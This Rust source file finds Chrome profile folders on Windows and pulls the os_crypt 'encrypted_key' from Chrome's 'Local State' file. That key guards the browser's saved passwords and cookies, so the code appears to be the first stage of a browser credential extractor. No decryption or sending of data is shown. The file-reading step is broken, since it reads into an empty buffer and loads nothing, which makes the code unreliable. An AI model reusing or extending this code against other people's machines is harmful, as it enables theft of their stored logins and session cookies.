use crate::err::*;
use glob::glob;
use json_minimal::Json;
use std::env::var;
use std::fs::File;
use std::io::Read;
use std::path::PathBuf;

fn get_home() -> PathBuf {
    let Ok(local_app_dir) = var("LOCALAPPDATA") else {
        panic!("LOCALAPPDATA is not set, {}", if cfg!(target_os = "windows") {
            "are you sure this system is properly configured?"
        } else {
            "are you sure you're running on Windows?"
        });
    };

    PathBuf::from(local_app_dir).join("Google/Chrome/User Data")
}

fn get_local_state() -> Result<PathBuf, PathError> {
    let local_state = get_home().join("Local State");

    if !local_state.exists() {
        return Err(PathError::LocalStateDoesNotExist(local_state));
    }

    Ok(local_state)
}

pub fn get_all_profiles() -> Result<Vec<PathBuf>, PathError> {
    let mut home = get_home().to_str().unwrap().to_string();
    let mut res = vec![];

    home.extend(['/', 'P', 'r', 'o', 'f', 'i', 'l', 'e', ' ', '*'].iter());

    let globber = match glob(home.as_str()) {
        Ok(g) => g,
        Err(e) => return Err(PathError::GlobError(e.to_string())),
    };

    for profile in globber {
        match profile {
            Ok(p) => res.push(p),
            Err(e) => return Err(PathError::SearchError(e.to_string())),
        };
    }

    Ok(res)
}

pub fn get_encryption_key() -> Result<String, LocalStateError> {
    // Read File
    let local_state = match get_local_state() {
        Ok(l) => l,
        Err(e) => return Err(LocalStateError::GetLocalStateError(e)),
    };

    let mut file = match File::open(local_state) {
        Ok(f) => f,
        Err(e) => return Err(LocalStateError::OpenError(e.to_string())),
    };
    let mut contents = vec![];

    match file.read(&mut contents) {
        Ok(_) => (), // Basically do nothing
        Err(e) => return Err(LocalStateError::ReadError(e.to_string())),
    }

    // Parse JSON
    let data = match Json::parse(&contents[..]) {
        Ok(d) => d,
        Err((at, err)) => return Err(LocalStateError::JsonReadError(at, err.to_string())),
    };

    // Beyond this lies hell
    // Code so poorly written it is the equivalent of
    // having the worst handwriting in class
    // If you dare to read the following code, then
    // I shall commend your bravery

    // TODO: DRY-ify this with a macro, ffs
    match data.get("os_crypt") {
        Some(os_crypt) => match os_crypt.get("encrypted_key") {
            Some(encrypted_key) => Ok(encrypted_key.print()),
            None => return Err(LocalStateError::JsonGetError(String::from("encrypted_key"))),
        },
        None => return Err(LocalStateError::JsonGetError(String::from("os_crypt"))),
    }
}
